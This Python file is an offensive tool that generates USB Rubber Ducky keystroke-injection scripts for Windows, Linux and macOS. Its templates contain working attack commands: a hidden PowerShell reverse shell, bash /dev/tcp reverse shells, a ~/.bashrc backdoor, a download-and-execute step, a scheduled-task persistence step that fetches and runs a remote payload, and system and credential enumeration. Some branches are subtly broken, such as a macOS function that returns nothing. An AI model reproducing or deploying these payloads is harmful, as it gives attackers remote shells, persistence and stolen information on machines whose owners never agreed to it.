#!/usr/bin/env python3
# USB RUBBER DUCKY SCRIPT GENERATOR
# Generate payload untuk USB Rubber Ducky

import os
import time
from core.colors import Colors

class RubberDuckyGenerator:
    def __init__(self):
        self.name = "USB Rubber Ducky Generator"
        self.output_dir = os.path.expanduser("~/.duality/ducky")
        os.makedirs(self.output_dir, exist_ok=True)
        
        self.keyboard_layouts = {
            'us': 'US',
            'uk': 'UK',
            'de': 'GERMAN',
            'fr': 'FRENCH',
            'jp': 'JAPANESE'
        }
        
        self.os_targets = ['windows', 'linux', 'mac']
    
    def generate_windows_payload(self, payload_type, lhost=None, lport=None):
        """Generate payload untuk Windows"""
        
        if payload_type == 'reverse_shell':
            script = f'''REM USB Rubber Ducky - Windows Reverse Shell
REM Target: Windows
REM Payload: Reverse Shell

DELAY 2000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 1000
STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
ENTER
'''
        elif payload_type == 'download_execute':
            url = input(f"{Colors.GREEN}Download URL > {Colors.END}")
            script = f'''REM USB Rubber Ducky - Windows Download & Execute
REM Target: Windows

DELAY 2000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 1000
STRING powershell -Command "Invoke-WebRequest -Uri '{url}' -OutFile $env:temp\\payload.exe; Start-Process $env:temp\\payload.exe"
ENTER
'''
        elif payload_type == 'credential_stealer':
            script = f'''REM USB Rubber Ducky - Windows Credential Stealer
REM Target: Windows

DELAY 2000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 1000
STRING powershell -Command "cmdkey /list; net user; ipconfig /all" > %temp%\\info.txt
ENTER
DELAY 2000
GUI r
DELAY 500
STRING notepad %temp%\\info.txt
ENTER
'''
        elif payload_type == 'persistence':
            script = f'''REM USB Rubber Ducky - Windows Persistence
REM Target: Windows

DELAY 2000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 1000
STRING schtasks /create /tn "SystemUpdate" /tr "powershell -Command Invoke-WebRequest -Uri 'http://{lhost}/payload.exe' -OutFile $env:temp\\update.exe; Start-Process $env:temp\\update.exe" /sc daily /st 09:00 /f
ENTER
'''
        else:
            script = f'''REM USB Rubber Ducky - Windows Default
REM Target: Windows

DELAY 2000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 1000
STRING whoami
ENTER
'''
        
        return script
    
    def generate_linux_payload(self, payload_type, lhost=None, lport=None):
        """Generate payload untuk Linux"""
        
        if payload_type == 'reverse_shell':
            script = f'''REM USB Rubber Ducky - Linux Reverse Shell
REM Target: Linux
REM Layout: US

DELAY 2000
GUI SPACE
DELAY 500
STRING terminal
ENTER
DELAY 2000
STRING bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
ENTER
'''
        elif payload_type == 'backdoor':
            script = f'''REM USB Rubber Ducky - Linux Backdoor
REM Target: Linux

DELAY 2000
GUI SPACE
DELAY 500
STRING terminal
ENTER
DELAY 2000
STRING echo 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' > ~/.bashrc
ENTER
'''
        else:
            script = f'''REM USB Rubber Ducky - Linux Info
REM Target: Linux

DELAY 2000
GUI SPACE
DELAY 500
STRING terminal
ENTER
DELAY 2000
STRING whoami && id && ifconfig
ENTER
'''
        
        return script
    
    def generate_mac_payload(self, payload_type, lhost=None, lport=None):
        """Generate payload untuk macOS"""
        
        if payload_type == 'reverse_shell':
            script = f'''REM USB Rubber Ducky - macOS Reverse Shell
REM Target: macOS

DELAY 2000
GUI SPACE
DELAY 500
STRING terminal
ENTER
DELAY 2000
STRING bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
ENTER
'''
        else:
            script = f'''REM USB Rubber Ducky - macOS Info
REM Target: macOS

DELAY 2000
GUI SPACE
DELAY 500
STRING terminal
ENTER
DELAY 2000
STRING whoami && system_profiler SPHardwareDataType
ENTER
'''
    
    def run(self):
        print(f"\n{Colors.CYAN}{'═'*55}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.WHITE}       🦆 USB RUBBER DUCKY GENERATOR{Colors.END}")
        print(f"{Colors.CYAN}{'═'*55}{Colors.END}")
        
        print(f"{Colors.GREEN}Target OS:{Colors.END}")
        print(f"  {Colors.CYAN}[1]{Colors.END} Windows")
        print(f"  {Colors.CYAN}[2]{Colors.END} Linux")
        print(f"  {Colors.CYAN}[3]{Colors.END} macOS")
        
        os_choice = input(f"\n{Colors.RED}└─{Colors.WHITE}$ {Colors.END}")
        
        os_map = {'1': 'windows', '2': 'linux', '3': 'mac'}
        target_os = os_map.get(os_choice, 'windows')
        
        print(f"\n{Colors.GREEN}Payload Type:{Colors.END}")
        print(f"  {Colors.CYAN}[1]{Colors.END} Reverse Shell")
        print(f"  {Colors.CYAN}[2]{Colors.END} Download & Execute")
        print(f"  {Colors.CYAN}[3]{Colors.END} Credential Stealer")
        print(f"  {Colors.CYAN}[4]{Colors.END} Persistence")
        print(f"  {Colors.CYAN}[5]{Colors.END} Info Gathering")
        
        payload_choice = input(f"\n{Colors.RED}└─{Colors.WHITE}$ {Colors.END}")
        
        payload_map = {'1': 'reverse_shell', '2': 'download_execute', 
                       '3': 'credential_stealer', '4': 'persistence', '5': 'info'}
        payload_type = payload_map.get(payload_choice, 'info')
        
        lhost = None
        lport = None
        if payload_type == 'reverse_shell':
            lhost = input(f"{Colors.GREEN}LHOST > {Colors.END}")
            lport = input(f"{Colors.GREEN}LPORT > {Colors.END}")
        
        if target_os == 'windows':
            script = self.generate_windows_payload(payload_type, lhost, lport)
        elif target_os == 'linux':
            script = self.generate_linux_payload(payload_type, lhost, lport)
        else:
            script = self.generate_mac_payload(payload_type, lhost, lport)
        
        filename = f"{self.output_dir}/ducky_{target_os}_{payload_type}_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            f.write(script)
        
        print(f"\n{Colors.GREEN}{'='*55}{Colors.END}")
        print(f"{Colors.BOLD}✅ SCRIPT GENERATED{Colors.END}")
        print(f"{Colors.GREEN}{'='*55}{Colors.END}")
        print(f"{Colors.WHITE}  File: {filename}")
        print(f"  Target: {target_os.upper()}")
        print(f"  Payload: {payload_type}")
        print(f"\n{Colors.CYAN}[*] Convert to inject.bin with duckencoder{Colors.END}")
        print(f"{Colors.CYAN}[*] Or use: java -jar duckencoder.jar -i {filename} -o inject.bin{Colors.END}")

if __name__ == "__main__":
    import time
    gen = RubberDuckyGenerator()
    gen.run()
